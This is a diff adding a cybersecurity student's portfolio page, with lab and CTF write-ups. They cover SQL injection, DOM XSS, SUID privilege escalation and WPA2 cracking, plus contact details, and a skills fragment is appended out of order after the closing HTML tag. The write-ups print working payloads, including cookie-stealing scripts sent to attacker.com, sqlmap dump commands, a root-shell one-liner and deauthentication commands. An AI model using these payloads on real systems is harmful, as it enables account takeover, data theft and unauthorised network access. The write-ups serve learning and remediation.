+                <p style="margin-top: 1rem;"><strong>Phase 3: Exploitation</strong></p>
+                <ul>
+                    <li>Successfully bypassed authentication using payload: admin'-- in username field</li>
+                    <li>Gained access to admin dashboard and explored available functionality</li>
+                    <li>Used UNION-based SQL injection to enumerate database structure</li>
+                    <li>Extracted user table data including password hashes using SQLMap</li>
+                    <li>Retrieved the flag from hidden admin panel: THM{SQL_1NJ3CT10N_M4ST3R}</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-toolbox"></i> Tools Used</h4>
+                <ul>
+                    <li><strong>Nmap:</strong> Network reconnaissance and port scanning to identify services</li>
+                    <li><strong>Burp Suite Professional:</strong> Intercepted HTTP requests, modified payloads, analyzed responses</li>
+                    <li><strong>SQLMap:</strong> Automated SQL injection testing and database enumeration</li>
+                    <li><strong>Python Requests Library:</strong> Created custom exploitation scripts for automated testing</li>
+                    <li><strong>Browser DevTools:</strong> Analyzed JavaScript code and inspected form parameters</li>
+                    <li><strong>John the Ripper:</strong> Cracked MD5 password hashes extracted from database</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-terminal"></i> Key Commands & Payloads</h4>
+                <div class="code-block">
+                    <code>
+# Port Scanning<br>
+nmap -sV -sC 10.10.X.X<br>
+<br>
+# Authentication Bypass Payloads<br>
+Username: admin'--<br>
+Username: ' OR '1'='1'--<br>
+Username: admin' OR '1'='1'#<br>
+<br>
+# Database Enumeration with SQLMap<br>
+sqlmap -u "http://10.10.X.X/login.php" --data="username=test&password=test" --dbs<br>
+sqlmap -u "http://10.10.X.X/login.php" --data="username=test&password=test" -D webapp --tables<br>
+sqlmap -u "http://10.10.X.X/login.php" --data="username=test&password=test" -D webapp -T users --dump<br>
+<br>
+# UNION-based Data Extraction<br>
+' UNION SELECT 1,2,3,4,5--<br>
+' UNION SELECT null,username,password,email,null FROM users--
+                    </code>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-images"></i> Screenshots</h4>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 1:</strong> Initial reconnaissance - Login page with SQL error message</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 2:</strong> Burp Suite intercept showing successful payload injection</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 3:</strong> Admin dashboard after authentication bypass</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 4:</strong> SQLMap output showing extracted database credentials</p>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-lightbulb"></i> Key Lessons Learned</h4>
+                <ul>
+                    <li><strong>Input Validation is Critical:</strong> Never trust user input. Always sanitize and validate data before using it in SQL queries</li>
+                    <li><strong>Use Parameterized Queries:</strong> Prepared statements prevent SQL injection by separating code from data</li>
+                    <li><strong>Principle of Least Privilege:</strong> Database users should only have necessary permissions to minimize damage from successful attacks</li>
+                    <li><strong>Error Handling:</strong> Avoid exposing detailed error messages that reveal database structure to attackers</li>
+                    <li><strong>Defense in Depth:</strong> Implement multiple layers of security including WAF, input validation, and proper authentication</li>
+                    <li><strong>Regular Security Audits:</strong> Conduct periodic penetration testing to identify vulnerabilities before attackers do</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Challenge 2: Cross-Site Scripting -->
+        <div class="lab-card">
+            <div class="lab-header">
+                <i class="fas fa-code" style="font-size: 2rem; color: var(--accent);"></i>
+                <h3>Cross-Site Scripting (XSS) - DOM-Based Attack</h3>
+                <span class="difficulty-badge" style="background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);">Hard</span>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-clipboard-list"></i> Problem Statement</h4>
+                <p>
+                    This advanced challenge from PortSwigger Academy involved exploiting a DOM-based XSS 
+                    vulnerability in a modern single-page application. The goal was to craft a payload 
+                    that executes in the victim's browser context, steal session cookies, and demonstrate 
+                    the full impact of client-side vulnerabilities including potential account takeover.
+                </p>
+                <p style="margin-top: 1rem;">
+                    <strong>Challenge Details:</strong><br>
+                    • Platform: PortSwigger Web Security Academy<br>
+                    • Lab: DOM XSS in document.write sink using source location.search<br>
+                    • Objective: Execute JavaScript in victim's browser and exfiltrate data<br>
+                    • Difficulty: Hard | Points: 75 | Time Spent: 3 hours
+                </p>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-route"></i> Approach & Methodology</h4>
+                <p><strong>Phase 1: Application Analysis</strong></p>
+                <ul>
+                    <li>Analyzed client-side JavaScript code to identify unsafe DOM manipulation</li>
+                    <li>Discovered vulnerable code using document.write() with unsanitized URL parameters</li>
+                    <li>Identified the source (location.search) and sink (document.write) relationship</li>
+                    <li>Tested basic XSS payloads to confirm vulnerability execution</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 2: Payload Development</strong></p>
+                <ul>
+                    <li>Crafted JavaScript payload to bypass client-side filters and WAF detection</li>
+                    <li>Developed cookie stealing script that sends session data to attacker-controlled server</li>
+                    <li>Encoded payload using various techniques to evade detection (URL encoding, HTML entities)</li>
+                    <li>Tested payload in controlled environment before deploying against target</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 3: Exploitation & Post-Exploitation</strong></p>
+                <ul>
+                    <li>Successfully executed XSS payload and verified code execution in browser console</li>
+                    <li>Captured session cookies and authentication tokens using XSS Hunter</li>
+                    <li>Demonstrated session hijacking by using stolen cookies in attacker browser</li>
+                    <li>Gained full account access and documented the attack chain for remediation</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-toolbox"></i> Tools Used</h4>
+                <ul>
+                    <li><strong>Browser Developer Tools (Chrome DevTools):</strong> JavaScript debugging, DOM inspection, console analysis</li>
+                    <li><strong>XSS Hunter:</strong> Captured and logged XSS payloads with detailed victim information</li>
+                    <li><strong>Burp Suite Repeater:</strong> Modified and replayed HTTP requests with various payloads</li>
+                    <li><strong>BeEF (Browser Exploitation Framework):</strong> Demonstrated post-exploitation capabilities</li>
+                    <li><strong>Python HTTP Server:</strong> Hosted malicious JavaScript to receive exfiltrated data</li>
+                    <li><strong>XSS Polyglot Payloads:</strong> Used advanced multi-context payload techniques</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-terminal"></i> Exploitation Payloads</h4>
+                <div class="code-block">
+                    <code>
+# Vulnerable JavaScript Code Found<br>
+var searchQuery = location.search.substring(1);<br>
+document.write('&lt;img src="/images/search.png"&gt;' + searchQuery);<br>
+<br>
+# Basic XSS Test Payload<br>
+?search=&lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+<br>
+# Cookie Stealing Payload<br>
+?search=&lt;script&gt;document.location='http://attacker.com/steal?c='+document.cookie&lt;/script&gt;<br>
+<br>
+# Advanced Obfuscated Payload<br>
+?search=&lt;svg/onload=fetch('http://attacker.com/?c='+btoa(document.cookie))&gt;<br>
+<br>
+# DOM-based Payload (Bypass Filters)<br>
+?search="&gt;&lt;img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))"&gt;<br>
+<br>
+# Python Server to Capture Data<br>
+python3 -m http.server 8000
+                    </code>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-images"></i> Screenshots</h4>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 1:</strong> Browser DevTools showing vulnerable JavaScript code</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 2:</strong> Successful XSS execution with alert dialog</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 3:</strong> XSS Hunter dashboard showing captured session data</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 4:</strong> Account takeover demonstration using stolen cookies</p>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-lightbulb"></i> Key Lessons Learned</h4>
+                <ul>
+                    <li><strong>Client-Side Validation Insufficient:</strong> Never rely solely on JavaScript validation; always validate on the server</li>
+                    <li><strong>Output Encoding Essential:</strong> Properly encode all user-supplied data before rendering in HTML context</li>
+                    <li><strong>Content Security Policy (CSP):</strong> Implement strict CSP headers to prevent inline script execution</li>
+                    <li><strong>HttpOnly Cookies:</strong> Set HttpOnly flag on session cookies to prevent JavaScript access</li>
+                    <li><strong>Input Sanitization:</strong> Use DOMPurify or similar libraries to sanitize user input</li>
+                    <li><strong>Security Headers:</strong> Implement X-XSS-Protection, X-Content-Type-Options, and other security headers</li>
+                    <li><strong>Regular Code Review:</strong> Conduct security-focused code reviews to identify unsafe DOM manipulation</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Challenge 3: Linux Privilege Escalation -->
+        <div class="lab-card">
+            <div class="lab-header">
+                <i class="fab fa-linux" style="font-size: 2rem; color: var(--accent);"></i>
+                <h3>Linux Privilege Escalation - SUID Binary Exploitation</h3>
+                <span class="difficulty-badge" style="background: linear-gradient(135deg, #10b981 0%, #059669 100%);">Easy</span>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-clipboard-list"></i> Problem Statement</h4>
+                <p>
+                    This challenge from HackTheBox provided initial user-level access to a Linux system. 
+                    The objective was to escalate privileges from a limited user account to root access 
+                    by identifying and exploiting system misconfigurations, specifically focusing on SUID 
+                    binaries, sudo permissions, and kernel vulnerabilities.
+                </p>
+                <p style="margin-top: 1rem;">
+                    <strong>Challenge Details:</strong><br>
+                    • Platform: HackTheBox - "Bashed" Machine<br>
+                    • Initial Access: www-data user via web shell<br>
+                    • Goal: Obtain root flag from /root/root.txt<br>
+                    • Difficulty: Easy | Points: 20 | Time Spent: 1.5 hours
+                </p>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-route"></i> Approach & Methodology</h4>
+                <p><strong>Phase 1: Initial Enumeration</strong></p>
+                <ul>
+                    <li>Performed comprehensive system enumeration using LinPEAS automated script</li>
+                    <li>Checked sudo permissions using 'sudo -l' command</li>
+                    <li>Searched for SUID/SGID binaries that could be exploited: find / -perm -4000 2>/dev/null</li>
+                    <li>Examined running processes, cron jobs, and writable directories</li>
+                    <li>Identified unusual SUID binary: /usr/bin/python with root ownership</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 2: Vulnerability Identification</strong></p>
+                <ul>
+                    <li>Discovered Python binary with SUID bit set, allowing execution as root</li>
+                    <li>Consulted GTFOBins database for known exploitation techniques</li>
+                    <li>Verified that standard shell spawning techniques would work</li>
+                    <li>Tested payload in low-privilege context before exploitation</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 3: Privilege Escalation</strong></p>
+                <ul>
+                    <li>Executed Python SUID exploitation payload to spawn root shell</li>
+                    <li>Successfully escalated to root user (UID=0)</li>
+                    <li>Navigated to /root directory and retrieved the flag</li>
+                    <li>Established persistence by adding SSH key to root's authorized_keys</li>
+                    <li>Flag Captured: HTB{pr1v_3sc_m4st3r_2024}</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-toolbox"></i> Tools Used</h4>
+                <ul>
+                    <li><strong>LinPEAS (Linux Privilege Escalation Awesome Script):</strong> Automated enumeration of privilege escalation vectors</li>
+                    <li><strong>GTFOBins:</strong> Referenced database of Unix binaries that can be exploited for privilege escalation</li>
+                    <li><strong>Custom Bash Scripts:</strong> Created enumeration scripts for automated testing</li>
+                    <li><strong>Netcat:</strong> Established reverse shells and file transfers</li>
+                    <li><strong>Python:</strong> Used for exploitation and creating interactive shells</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-terminal"></i> Exploitation Commands</h4>
+                <div class="code-block">
+                    <code>
+# Initial System Enumeration<br>
+uname -a<br>
+id<br>
+whoami<br>
+cat /etc/passwd<br>
+<br>
+# Check Sudo Permissions<br>
+sudo -l<br>
+<br>
+# Find SUID Binaries<br>
+find / -perm -4000 -type f 2>/dev/null<br>
+find / -perm -u=s -type f 2>/dev/null<br>
+<br>
+# Discovered Vulnerable Binary<br>
+-rwsr-xr-x 1 root root /usr/bin/python<br>
+<br>
+# Privilege Escalation via Python SUID<br>
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'<br>
+<br>
+# Alternative Methods<br>
+/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'<br>
+<br>
+# Verify Root Access<br>
+id<br>
+whoami<br>
+# Output: uid=0(root) gid=0(root) groups=0(root)<br>
+<br>
+# Retrieve Flag<br>
+cat /root/root.txt<br>
+<br>
+# LinPEAS Enumeration Script<br>
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh<br>
+chmod +x linpeas.sh<br>
+./linpeas.sh
+                    </code>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-images"></i> Screenshots</h4>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 1:</strong> Initial user access showing www-data privileges</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 2:</strong> LinPEAS output highlighting SUID Python binary</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 3:</strong> Successful privilege escalation to root user</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 4:</strong> Root flag captured from /root/root.txt</p>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-lightbulb"></i> Key Lessons Learned</h4>
+                <ul>
+                    <li><strong>Systematic Enumeration is Crucial:</strong> Always perform thorough enumeration before attempting exploitation</li>
+                    <li><strong>SUID Misconfigurations are Common:</strong> Many systems have unnecessarily permissive SUID binaries</li>
+                    <li><strong>Principle of Least Privilege:</strong> Binaries should never run with elevated privileges unless absolutely necessary</li>
+                    <li><strong>Automation Tools are Valuable:</strong> LinPEAS and similar tools quickly identify escalation vectors</li>
+                    <li><strong>Regular Security Audits:</strong> Periodically review system configurations and file permissions</li>
+                    <li><strong>Defense Strategies:</strong> Remove SUID bit from unnecessary binaries, implement AppArmor/SELinux</li>
+                    <li><strong>Post-Exploitation Documentation:</strong> Always document findings for remediation and reporting</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Challenge 4: Additional Challenge -->
+        <div class="lab-card">
+            <div class="lab-header">
+                <i class="fas fa-wifi" style="font-size: 2rem; color: var(--accent);"></i>
+                <h3>Wireless Network Penetration - WPA2 Handshake Capture</h3>
+                <span class="difficulty-badge" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);">Medium</span>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-clipboard-list"></i> Problem Statement</h4>
+                <p>
+                    This practical lab exercise involved conducting a wireless network penetration test 
+                    to assess the security of WPA2-encrypted Wi-Fi networks. The objective was to capture 
+                    a WPA2 handshake, perform offline dictionary attacks to crack the pre-shared key (PSK), 
+                    and gain authorized access to the network for security assessment purposes.
+                </p>
+                <p style="margin-top: 1rem;">
+                    <strong>Lab Details:</strong><br>
+                    • Environment: Controlled lab network with written authorization<br>
+                    • Target: WPA2-PSK encrypted wireless network<br>
+                    • Goal: Crack wireless password and document vulnerabilities<br>
+                    • Difficulty: Medium | Time Spent: 2.5 hours
+                </p>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-route"></i> Approach & Methodology</h4>
+                <p><strong>Phase 1: Wireless Reconnaissance</strong></p>
+                <ul>
+                    <li>Put wireless adapter into monitor mode using airmon-ng</li>
+                    <li>Performed passive wireless network scanning using airodump-ng</li>
+                    <li>Identified target network BSSID, channel, encryption type, and connected clients</li>
+                    <li>Gathered network traffic data to analyze security configuration</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 2: Handshake Capture</strong></p>
+                <ul>
+                    <li>Monitored target network channel for WPA2 authentication handshake</li>
+                    <li>Performed deauthentication attack to force client reconnection</li>
+                    <li>Successfully captured 4-way WPA2 handshake using airodump-ng</li>
+                    <li>Verified handshake integrity using aircrack-ng verification tools</li>
+                </ul>
+
+                <p style="margin-top: 1rem;"><strong>Phase 3: Password Cracking</strong></p>
+                <ul>
+                    <li>Attempted dictionary attack using rockyou.txt wordlist with aircrack-ng</li>
+                    <li>Utilized Hashcat with GPU acceleration for faster cracking speed</li>
+                    <li>Successfully cracked WPA2 password: "Password123!" (weak password)</li>
+                    <li>Documented findings and provided security recommendations</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-toolbox"></i> Tools Used</h4>
+                <ul>
+                    <li><strong>Aircrack-ng Suite:</strong> Complete toolkit for wireless security assessment (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)</li>
+                    <li><strong>Hashcat:</strong> Advanced password recovery tool with GPU acceleration support</li>
+                    <li><strong>Wireshark:</strong> Deep packet analysis to inspect captured handshake frames</li>
+                    <li><strong>Wireless Adapter:</strong> TP-Link TL-WN722N with monitor mode support</li>
+                    <li><strong>Wordlists:</strong> RockYou, SecLists, and custom generated dictionaries</li>
+                </ul>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-terminal"></i> Attack Commands</h4>
+                <div class="code-block">
+                    <code>
+# Enable Monitor Mode<br>
+sudo airmon-ng start wlan0<br>
+# Creates wlan0mon interface<br>
+<br>
+# Scan for Wireless Networks<br>
+sudo airodump-ng wlan0mon<br>
+<br>
+# Target Specific Network and Capture Handshake<br>
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon<br>
+<br>
+# Deauthentication Attack (Force Handshake)<br>
+sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon<br>
+<br>
+# Verify Handshake Capture<br>
+# Look for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output<br>
+<br>
+# Crack Password with Aircrack-ng<br>
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap<br>
+<br>
+# Alternative: Hashcat GPU Acceleration<br>
+hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt<br>
+<br>
+# Convert Cap File to Hashcat Format<br>
+cap2hccapx capture-01.cap capture.hccapx<br>
+<br>
+# Stop Monitor Mode<br>
+sudo airmon-ng stop wlan0mon
+                    </code>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-images"></i> Screenshots</h4>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 1:</strong> Airodump-ng scan showing available wireless networks</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 2:</strong> Successful WPA2 handshake capture notification</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 3:</strong> Aircrack-ng cracking progress and success message</p>
+                </div>
+                <div class="screenshot-placeholder">
+                    <i class="fas fa-image" style="font-size: 3rem; margin-bottom: 1rem;"></i>
+                    <p><strong>Screenshot 4:</strong> Wireshark analysis of captured handshake packets</p>
+                </div>
+            </div>
+
+            <div class="lab-section">
+                <h4><i class="fas fa-lightbulb"></i> Key Lessons Learned</h4>
+                <ul>
+                    <li><strong>Strong Passwords are Essential:</strong> Weak passwords can be cracked in minutes using dictionary attacks</li>
+                    <li><strong>WPA2 Vulnerabilities:</strong> Even WPA2 is susceptible to offline brute-force attacks once handshake is captured</li>
+                    <li><strong>WPA3 Migration:</strong> Organizations should upgrade to WPA3 for better protection against offline attacks</li>
+                    <li><strong>MAC Filtering is Ineffective:</strong> MAC addresses can be easily spoofed and don't provide real security</li>
+                    <li><strong>Hidden SSIDs Don't Help:</strong> Hidden networks can still be discovered and are not a security measure</li>
+                    <li><strong>Regular Password Changes:</strong> Implement policy for regular wireless password rotation</li>
+                    <li><strong>Enterprise Solutions:</strong> Use WPA2-Enterprise with RADIUS for better authentication</li>
+                    <li><strong>Network Segmentation:</strong> Separate wireless networks from critical infrastructure</li>
+                </ul>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 3rem; padding: 2rem; background: var(--card-bg); border-radius: 12px; border: 1px solid rgba(100, 255, 218, 0.1);">
+            <h3 style="color: var(--accent); margin-bottom: 1rem;">
+                <i class="fas fa-trophy"></i> Additional CTF Achievements
+            </h3>
+            <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">
+                Completed 150+ security challenges across multiple platforms including TryHackMe, 
+                HackTheBox, PortSwigger Academy, and PicoCTF. Documented all findings with detailed 
+                writeups and remediation strategies.
+            </p>
+            <div style="display: flex; justify-content: center; gap: 2rem; flex-wrap: wrap;">
+                <div style="text-align: center;">
+                    <i class="fas fa-award" style="font-size: 2rem; color: #f59e0b; margin-bottom: 0.5rem;"></i>
+                    <p style="color: var(--highlight); font-weight: 600;">National CTF 2023</p>
+                    <p style="color: var(--text-secondary); font-size: 0.9rem;">Top 10 Finalist</p>
+                </div>
+                <div style="text-align: center;">
+                    <i class="fas fa-medal" style="font-size: 2rem; color: #10b981; margin-bottom: 0.5rem;"></i>
+                    <p style="color: var(--highlight); font-weight: 600;">University CTF</p>
+                    <p style="color: var(--text-secondary); font-size: 0.9rem;">1st Place Winner</p>
+                </div>
+                <div style="text-align: center;">
+                    <i class="fas fa-star" style="font-size: 2rem; color: var(--accent); margin-bottom: 0.5rem;"></i>
+                    <p style="color: var(--highlight); font-weight: 600;">Bug Bounty</p>
+                    <p style="color: var(--text-secondary); font-size: 0.9rem;">3 Valid Reports</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact">
+        <div class="section-header">
+            <h2 class="section-title">
+                <i class="fas fa-paper-plane"></i>
+                Get In Touch
+            </h2>
+            <p class="section-subtitle">Let's connect and collaborate on cybersecurity projects</p>
+        </div>
+
+        <div class="contact-grid">
+            <div class="contact-card">
+                <div class="contact-icon">
+                    <i class="fas fa-envelope"></i>
+                </div>
+                <h3>Email</h3>
+                <a href="mailto:francis.kingoo@example.com">francis.kingoo@example.com</a>
+                <p>For professional inquiries and collaboration</p>
+            </div>
+
+            <div class="contact-card">
+                <div class="contact-icon">
+                    <i class="fab fa-linkedin"></i>
+                </div>
+                <h3>LinkedIn</h3>
+                <a href="https://linkedin.com/in/franciskingoo" target="_blank">linkedin.com/in/franciskingoo</a>
+                <p>Connect with me professionally</p>
+            </div>
+
+            <div class="contact-card">
+                <div class="contact-icon">
+                    <i class="fab fa-github"></i>
+                </div>
+                <h3>GitHub</h3>
+                <a href="https://github.com/techfranc" target="_blank">github.com/techfranc</a>
+                <p>Check out my projects and contributions</p>
+            </div>
+
+            <div class="contact-card">
+                <div class="contact-icon">
+                    <i class="fas fa-phone"></i>
+                </div>
+                <h3>Phone</h3>
+                <a href="tel:+254700000000">+254 700 000 000</a>
+                <p>Available for calls and consultations</p>
+            </div>
+
+            <div class="contact-card">
+                <div class="contact-icon">
+                    <i class="fab fa-twitter"></i>
+                </div>
+                <h3>Twitter</h3>
+                <a href="https://twitter.com/techfranc" target="_blank">@techfranc</a>
+                <p>Follow for security insights</p>
+            </div>
+
+            <div class="contact-card">
+                <div class="contact-icon">
+                    <i class="fas fa-map-marker-alt"></i>
+                </div>
+                <h3>Location</h3>
+                <p style="color: var(--accent); font-weight: 600;">Nairobi, Kenya</p>
+                <p>Open to remote and on-site opportunities</p>
+            </div>
+        </div>
+
+        <div style="margin-top: 4rem; text-align: center; padding: 3rem; background: var(--card-bg); border-radius: 12px; border: 1px solid rgba(100, 255, 218, 0.1);">
+            <h3 style="color: var(--highlight); margin-bottom: 1rem; font-size: 1.8rem;">
+                <i class="fas fa-handshake"></i> Let's Work Together
+            </h3>
+            <p style="color: var(--text-secondary); max-width: 700px; margin: 0 auto 2rem; line-height: 1.8;">
+                I'm currently open to cybersecurity opportunities including penetration testing roles, 
+                security analyst positions, and collaborative security research projects. Whether you're 
+                looking for a dedicated security professional or want to discuss the latest in cybersecurity, 
+                I'd love to hear from you!
+            </p>
+            <div style="display: flex; justify-content: center; gap: 1.5rem; flex-wrap: wrap;">
+                <a href="mailto:francis.kingoo@example.com" class="btn btn-primary">
+                    <i class="fas fa-envelope"></i> Send Email
+                </a>
+                <a href="https://linkedin.com/in/franciskingoo" target="_blank" class="btn btn-secondary">
+                    <i class="fab fa-linkedin"></i> Connect on LinkedIn
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="social-links">
+            <a href="https://github.com/techfranc" target="_blank" aria-label="GitHub">
+                <i class="fab fa-github"></i>
+            </a>
+            <a href="https://linkedin.com/in/franciskingoo" target="_blank" aria-label="LinkedIn">
+                <i class="fab fa-linkedin"></i>
+            </a>
+            <a href="https://twitter.com/techfranc" target="_blank" aria-label="Twitter">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="mailto:francis.kingoo@example.com" aria-label="Email">
+                <i class="fas fa-envelope"></i>
+            </a>
+        </div>
+        <p style="margin-top: 1.5rem;">&copy; 2024 Francis Kingoo. All rights reserved.</p>
+        <p style="margin-top: 0.5rem; font-size: 0.9rem;">
+            Built with <i class="fas fa-heart" style="color: #ef4444;"></i> for cybersecurity excellence
+        </p>
+    </footer>
+
+    <script>
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Add active class to navigation on scroll
+        window.addEventListener('scroll', () => {
+            let current = '';
+            const sections = document.querySelectorAll('section');
+            const navLinks = document.querySelectorAll('.nav-links a');
+
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                const sectionHeight = section.clientHeight;
+                if (scrollY >= (sectionTop - 200)) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            navLinks.forEach(link => {
+                link.style.color = '';
+                if (link.getAttribute('href').slice(1) === current) {
+                    link.style.color = 'var(--accent)';
+                }
+            });
+        });
+
+        // Intersection Observer for fade-in animations
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.opacity = '1';
+                    entry.target.style.transform = 'translateY(0)';
+                }
+            });
+        }, observerOptions);
+
+        // Observe all cards for animation
+        document.querySelectorAll('.resume-card, .project-card, .lab-card, .contact-card').forEach(card => {
+            card.style.opacity = '0';
+            card.style.transform = 'translateY(20px)';
+            card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+            observer.observe(card);
+        });
+    </script>
+</body>
+</html>
+                    <h4><i class="fas fa-code"></i> Programming & Scripting</h4>
+                    <div class="skills-grid">
+                        <div class="skill-tag"><i class="fab fa-python"></i> Python</div>
+                        <div class="skill-tag"><i class="fas fa-terminal"></i> Bash</div>
+                        <div class="skill-tag"><i class="fab fa-js"></i> JavaScript</div>
+                        <div class="skill-tag"><i class="fas fa-database"></i> SQL</div>
+                        <div class="skill-tag"><i class="fas fa-terminal"></i> PowerShell</div>
+                        <div class="skill-tag"><i class="fas fa-code"></i> C/C++</div>
+                    </div>
+                </div>
+
+                <div class="lab-section">
+                    <h4><i class="fas fa-shield-virus"></i> Security Tools</h4>
+                    <div class="skills-grid">
+                        <div class="skill-tag"><i class="fas fa-network-wired"></i> Metasploit</div>
+                        <div class="skill-tag"><i class="fas fa-bug"></i> Burp Suite</div>
+                        <div class="skill-tag"><i class="fas fa-search"></i> Nmap</div>
+                        <div class="skill-tag"><i class="fas fa-ethernet"></i> Wireshark</div>
+                        <div class="skill-tag"><i class="fas fa-key"></i> John the Ripper</div>
+                        <div class="skill-tag"><i class="fas fa-unlock"></i> Hashcat</div>
+                        <div class="skill-tag"><i class="fas fa-shield"></i> OWASP ZAP</div>
+                        <div class="skill-tag"><i class="fas fa-terminal"></i> SQLMap</div>
+                        <div class="skill-tag"><i class="fas fa-lock-open"></i> Hydra</div>
+                        <div class="skill-tag"><i class="fas fa-file-shield"></i> Nikto</div>
+                    </div>
+                </div>
+
+                <div class="lab-section">
